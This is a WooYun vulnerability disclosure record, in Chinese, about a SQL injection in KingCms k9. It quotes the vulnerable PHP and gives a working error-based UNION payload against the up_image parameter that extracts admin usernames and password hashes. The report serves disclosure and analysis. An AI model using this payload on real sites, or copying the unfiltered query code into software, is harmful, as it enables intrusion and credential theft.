{"id": 37019, "wybug_id": "wooyun-2015-0100607", "wybug_title": "KingCms最新版（k9）注入一枚", "wybug_corp": "KingCms", "wybug_author": "路人甲", "wybug_date": "2015-03-11 11:49", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： KingCms最新版（k9）注入一枚 详细说明：  朋友的公司想购买kingcms的授权，让我帮忙看下。发现kingcms很长一段时间没更新了，憋了一段时间放出了最新版的k9(2014-12-13更新)，官网下下来学习一下。在wooyun上看到了几个漏洞，如： WooYun: kingcms最新版sql注入漏洞 注入点：GET /images/index.php?jsoncallback=1&_=1&CMD=show&up_image=1003/**/UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(0x23,(SELECT/**/concat(username,0x23,userpass)FROM/**/king_user/**/LIMIT/**/0,1),0x23,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.tables/**/GROUP/**/BY/**/x)a&AJAX=1 注入参数：up_image问题文件在/images/index.php\nfunction _show(){\t\tif(empty($_POST['up_image'])) kc_tip('图片ID读取错误!');\t$id=$_POST['up_image'];\t$db=new db;\t$rs=$db->getRows_one('%s_up_image','path','image='.$id);\tif(empty($rs)) kc_tip('图片丢失!');\t//读取图片长宽尺寸\t$size=@getimagesize(ROOT.PATH_UP.'/'.$rs['path']);\t$_width=$size[0];\t$_height=$size[1];\t\t$w=$_width;\t$h=$_height;\t$size=580;\tif($w>$size){\t\t$w=$size;\t\t$h=round($size*($_height/$_width));\t}\tif($h>$size){\t\t$h=$size;\t\t$w=round($size*($_width/$_height));\t}\t\t$attrib=array('width'=>$w,'height'=>$h);\t$param=http_build_query($attrib);\t\t$s=\"<a href=\\\"\".FULLURL.\"images/?{$id}.jpg\\\" target=\\\"_blank\\\"><img src=\\\"\".FULLURL.\"images/?id=$id&$param&sign=\".md5('id='.$id.$param.kc_config('system.salt')).\".jpg\\\"/></a>\";\t\tkc_ajax(array(\t\t'TITLE'=>'图像预览 W='.$_width.'px,H='.$_height.'px',\t\t'MAIN'=>$s,\t\t'ID'=>'k_ajax',\t\t'WIDTH'=>$w,\t\t'HEIGHT'=>$h\t));}\n在获取到id后（$id=$_POST['up_image'];）并没有进行任意过滤，kingcms也没有全局过滤，就执行了$db->getRows_one（）,去看看$db->getRows_one\npublic function getRows_one($table,$insql='*',$where=null,$orderby=null) {\t\t$table=str_replace('%s',DB_PRE,$table);\t\t$sql=\"SELECT $insql FROM $table \";\t\t$sql.=empty($where) ? '' : ' WHERE '.$where;\t\t$sql.=empty($orderby) ? '' : ' ORDER BY '.$orderby;\t\treturn $this->get_one($sql);\t}\n同样没有过滤，因此，这里存在注入Kingcms可以报错，因此Payload：\n1003/**/UNION/**/SELECT/**/1/**/FROM(SELECT/**/COUNT(*),CONCAT(0x23,(SELECT/**/concat(username,0x23,userpass)FROM/**/king_user/**/LIMIT/**/0,1),0x23,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.tables/**/GROUP/**/BY/**/x)a\n注入成功，见下图\n\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}